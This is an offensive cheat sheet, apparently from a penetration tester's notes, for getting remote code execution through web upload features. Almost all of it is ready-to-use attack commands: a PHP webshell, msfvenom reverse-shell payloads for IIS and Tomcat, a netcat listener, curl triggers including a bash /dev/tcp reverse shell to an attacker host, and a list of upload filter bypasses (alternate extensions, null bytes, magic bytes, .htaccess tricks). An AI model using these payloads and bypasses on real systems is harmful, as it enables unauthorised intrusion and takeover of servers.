## Goal
Upload a webshell / reverse shell through an upload feature, bypassing filters. A working upload = RCE.

**Checklist**
- [ ] upload feature exists?
- [ ] server-side language known? (php/asp/aspx/jsp)
- [ ] filter bypass needed? (extension / content-type / magic bytes)
- [ ] where did the file land? (find the upload path)

# Commands

### Step 1: Build a shell for the stack
```bash
echo '<?php system($_GET["c"]); ?>' > cmd.php                                    # PHP webshell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php ; nano shell.php      # set IP/port
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx   # IIS
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.jsp        # Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war         # Tomcat mgr
nc -lvnp 4444
```

### Step 2: Find where it landed + trigger
```bash
# common upload dirs:
http://$IP/uploads/shell.php   http://$IP/images/shell.php   http://$IP/files/shell.php
curl "http://$IP/uploads/cmd.php?c=id"
# upgrade webshell -> reverse shell:
curl "http://$IP/uploads/cmd.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"
```

### Step 3: Extension bypasses (PHP)
```bash
.phtml .phar .pht .php3 .php4 .php5 .php7 .phps .inc      # alt extensions
.Php .pHp .PHP                                            # case variation
shell.php.jpg  shell.php%00.jpg                           # double / null-byte
# magic bytes: prepend  GIF89a;  to the file
# .htaccess: upload one with  AddType application/x-httpd-php .xyz  then upload shell.xyz
```

### Step 4: Extension bypasses (IIS / ASP)
```bash
.asp .aspx .ashx .asmx .cer .soap
shell.asp;.jpg           # IIS 6 semicolon trick
# content-type: change to image/png in Burp
```

### Helpline
```bash
# can't find upload path? dir-brute /uploads /images /files (00_recon_dirbrute)
# Tomcat /manager + creds -> deploy shell.war
# upload+LFI combo: upload a .txt shell, include it via LFI
```
